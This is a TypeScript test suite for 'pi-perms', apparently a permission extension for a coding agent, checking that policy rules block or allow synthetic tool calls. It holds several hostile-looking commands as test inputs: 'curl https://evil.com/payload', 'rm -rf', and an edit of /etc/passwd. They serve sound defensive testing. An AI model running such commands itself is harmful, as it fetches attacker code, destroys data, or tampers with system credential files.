/**
 * E2E tests for the pi-perms extension.
 *
 * Loads the extension factory directly with a mock ExtensionAPI,
 * fires synthetic tool_call events, and asserts block/allow behaviour.
 */

import { after, describe, it } from "node:test";
import assert from "node:assert/strict";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { join } from "node:path";
import { tmpdir } from "node:os";

import type {
  ExtensionContext,
  ExtensionFactory,
  ToolCallEvent,
  ToolCallEventResult,
} from "@earendil-works/pi-coding-agent";

import piPerms from "../extension.ts";

/**
 * Minimal mock ExtensionAPI.
 * Captures handlers registered via `on()`.
 */
function createMockApi() {
  const handlers = new Map<string, (event: unknown, ctx: unknown) => unknown>();
  return {
    handlers,
    on(event: string, handler: (event: unknown, ctx: unknown) => unknown) {
      handlers.set(event, handler);
    },
  };
}

function createMockContext(cwd: string): ExtensionContext {
  return { cwd, hasUI: false } as unknown as ExtensionContext;
}

/**
 * Fire a tool_call event through the extension's handler.
 */
async function fireToolCall(
  api: ReturnType<typeof createMockApi>,
  ctx: ExtensionContext,
  toolName: string,
  input: Record<string, unknown>,
): Promise<ToolCallEventResult | undefined> {
  const handler = api.handlers.get("tool_call");
  assert.ok(handler, "tool_call handler must be registered");

  const event = {
    type: "tool_call",
    toolCallId: "test-call",
    toolName,
    input,
  } as ToolCallEvent;

  return handler(event, ctx) as Promise<ToolCallEventResult | undefined>;
}

describe("pi-perms extension e2e", () => {
  const dirs: string[] = [];

  async function setup(): Promise<string> {
    const cwd = await mkdtemp(join(tmpdir(), "pi-perms-e2e-"));
    dirs.push(cwd);
    return cwd;
  }

  after(async () => {
    await Promise.all(dirs.map((d) => rm(d, { recursive: true })));
  });

  it("registers a tool_call handler", () => {
    const api = createMockApi();
    piPerms(api as unknown as Parameters<ExtensionFactory>[0]);
    assert.ok(api.handlers.has("tool_call"));
  });

  it("allows bash when no policy exists", async () => {
    const cwd = await setup();
    const api = createMockApi();
    piPerms(api as unknown as Parameters<ExtensionFactory>[0]);

    const result = await fireToolCall(api, createMockContext(cwd), "bash", {
      command: "echo hello",
    });
    assert.equal(result, undefined);
  });

  it("blocks bash when denied by policy", async () => {
    const cwd = await setup();
    await mkdir(join(cwd, ".agents"), { recursive: true });
    await writeFile(
      join(cwd, ".agents", "permissions.json"),
      JSON.stringify({
        defaultMode: "standard",
        permissions: {
          deny: ["Bash(rm *)"],
        },
      }),
    );

    const api = createMockApi();
    piPerms(api as unknown as Parameters<ExtensionFactory>[0]);

    const result = await fireToolCall(api, createMockContext(cwd), "bash", {
      command: "rm -rf /tmp/thing",
    });
    assert.deepEqual(result, {
      block: true,
      reason: "Denied by permission policy",
    });
  });

  it("allows bash when matched by allow rule", async () => {
    const cwd = await setup();
    await mkdir(join(cwd, ".agents"), { recursive: true });
    await writeFile(
      join(cwd, ".agents", "permissions.json"),
      JSON.stringify({
        defaultMode: "standard",
        permissions: {
          allow: ["Bash(git *)"],
        },
      }),
    );

    const api = createMockApi();
    piPerms(api as unknown as Parameters<ExtensionFactory>[0]);

    const result = await fireToolCall(api, createMockContext(cwd), "bash", {
      command: "git commit -m test",
    });
    assert.equal(result, undefined);
  });

  it("blocks edit to protected paths", async () => {
    const cwd = await setup();
    await mkdir(join(cwd, ".agents"), { recursive: true });
    await writeFile(
      join(cwd, ".agents", "permissions.json"),
      JSON.stringify({
        defaultMode: "autonomous",
        permissions: {
          deny: ["Edit(/etc/*)", "Write(/etc/*)"],
        },
      }),
    );

    const api = createMockApi();
    piPerms(api as unknown as Parameters<ExtensionFactory>[0]);

    const result = await fireToolCall(api, createMockContext(cwd), "edit", {
      path: "/etc/passwd",
    });
    assert.deepEqual(result, {
      block: true,
      reason: "Denied by permission policy",
    });
  });

  it("allows read tool in autonomous mode", async () => {
    const cwd = await setup();
    await mkdir(join(cwd, ".agents"), { recursive: true });
    await writeFile(
      join(cwd, ".agents", "permissions.json"),
      JSON.stringify({
        defaultMode: "autonomous",
      }),
    );

    const api = createMockApi();
    piPerms(api as unknown as Parameters<ExtensionFactory>[0]);

    const result = await fireToolCall(api, createMockContext(cwd), "read", {
      path: "/etc/hosts",
    });
    assert.equal(result, undefined);
  });

  it("loads policy from .agents/permissions.local.json", async () => {
    const cwd = await setup();
    await mkdir(join(cwd, ".agents"), { recursive: true });
    await writeFile(
      join(cwd, ".agents", "permissions.json"),
      JSON.stringify({
        defaultMode: "autonomous",
        permissions: {
          allow: ["Bash(*)"],
        },
      }),
    );
    await writeFile(
      join(cwd, ".agents", "permissions.local.json"),
      JSON.stringify({
        permissions: {
          deny: ["Bash(domain:evil.com)"],
        },
      }),
    );

    const api = createMockApi();
    piPerms(api as unknown as Parameters<ExtensionFactory>[0]);

    // Denied by local override
    const denied = await fireToolCall(api, createMockContext(cwd), "bash", {
      command: "curl https://evil.com/payload",
    });
    assert.deepEqual(denied, {
      block: true,
      reason: "Denied by permission policy",
    });

    // Allowed by committed policy (not overridden)
    const allowed = await fireToolCall(api, createMockContext(cwd), "bash", {
      command: "git status",
    });
    assert.equal(allowed, undefined);
  });

  it("uses custom block message from config", async () => {
    // The extension currently uses DEFAULT_CONFIG with no blockMessage,
    // so this test documents the default behaviour.
    const cwd = await setup();
    await mkdir(join(cwd, ".agents"), { recursive: true });
    await writeFile(
      join(cwd, ".agents", "permissions.json"),
      JSON.stringify({
        permissions: {
          deny: ["Bash(*)"],
        },
      }),
    );

    const api = createMockApi();
    piPerms(api as unknown as Parameters<ExtensionFactory>[0]);

    const result = await fireToolCall(api, createMockContext(cwd), "bash", {
      command: "anything",
    });
    assert.ok(result);
    assert.equal(result.block, true);
    assert.equal(result.reason, "Denied by permission policy");
  });

  it("denies everything in readonly mode", async () => {
    const cwd = await setup();
    await mkdir(join(cwd, ".agents"), { recursive: true });
    await writeFile(
      join(cwd, ".agents", "permissions.json"),
      JSON.stringify({
        defaultMode: "readonly",
      }),
    );

    const api = createMockApi();
    piPerms(api as unknown as Parameters<ExtensionFactory>[0]);

    const result = await fireToolCall(api, createMockContext(cwd), "bash", {
      command: "ls",
    });
    assert.deepEqual(result, {
      block: true,
      reason: "Denied by permission policy",
    });
  });

  it("handles MCP tool names with wildcard deny", async () => {
    const cwd = await setup();
    await mkdir(join(cwd, ".agents"), { recursive: true });
    await writeFile(
      join(cwd, ".agents", "permissions.json"),
      JSON.stringify({
        defaultMode: "autonomous",
        permissions: {
          deny: ["mcp__*__delete*"],
        },
      }),
    );

    const api = createMockApi();
    piPerms(api as unknown as Parameters<ExtensionFactory>[0]);

    // MCP delete tool blocked
    const blocked = await fireToolCall(
      api,
      createMockContext(cwd),
      "mcp__github__delete_issue",
      { owner: "test", repo: "test", number: 1 },
    );
    assert.deepEqual(blocked, {
      block: true,
      reason: "Denied by permission policy",
    });

    // MCP read tool allowed
    const allowed = await fireToolCall(
      api,
      createMockContext(cwd),
      "mcp__github__list_issues",
      { owner: "test", repo: "test" },
    );
    assert.equal(allowed, undefined);
  });
});
